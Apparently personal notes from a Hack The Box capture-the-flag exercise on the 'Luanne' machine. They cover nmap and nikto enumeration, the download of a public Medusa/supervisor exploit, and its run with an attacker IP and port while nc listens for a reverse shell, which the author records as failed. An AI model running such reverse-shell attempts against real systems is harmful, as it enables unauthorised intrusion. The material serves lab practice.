Luanne
========================

# Enumeration

    sudo nmap_enum luanne.htb | tee nmap_output.txt
  
![qownnotes-media-UacodT](../../../media/qownnotes-media-UacodT.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn luanne.htb | tee nmap_udp_output.txt

![qownnotes-media-AxxIHK](../../../media/qownnotes-media-AxxIHK.png)

    sudo nmap -p- -Pn -T5 -n luanne.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-itDzcJ](../../../media/qownnotes-media-itDzcJ.png)

    sudo nmap -sS --script vuln -n -T5 -Pn luanne.htb -p 22,80,9001 | tee nmap_vulns.txt
    
![qownnotes-media-WwkXnW](../../../media/qownnotes-media-WwkXnW.png)


## Scan

    nikto -host http://luanne.htb -T x 6 | tee nikto_output.txt
    
![qownnotes-media-eqMRRV](../../../media/qownnotes-media-eqMRRV.png)


    firefox http://luanne.htb/weather

![qownnotes-media-cMtOcZ](../../../media/qownnotes-media-cMtOcZ.png)

# Exploitation

    searchsploit weather
    searchsploit medusa
    searchsploit supervisor process manager
    wget https://gist.githubusercontent.com/mhaskar/74107e04a2f90cab195ff8e5aa7b85c3/raw/ad55666d3f5108c89fbc52b6d2f563b8fa434b5e/Medusa-Exploit.py
    python2 Medusa-Exploit.py http://luanne.htb:9001 10.10.14.14 8081

![qownnotes-media-YLxdKj](../../../media/qownnotes-media-YLxdKj.png)

![qownnotes-media-ziASNk](../../../media/qownnotes-media-ziASNk.png)

    nc -nlvp 8081

![qownnotes-media-PRNWBk](../../../media/qownnotes-media-PRNWBk.png)


**NÃO FUNCIONOU**

Vamos tentar com outra abordagem


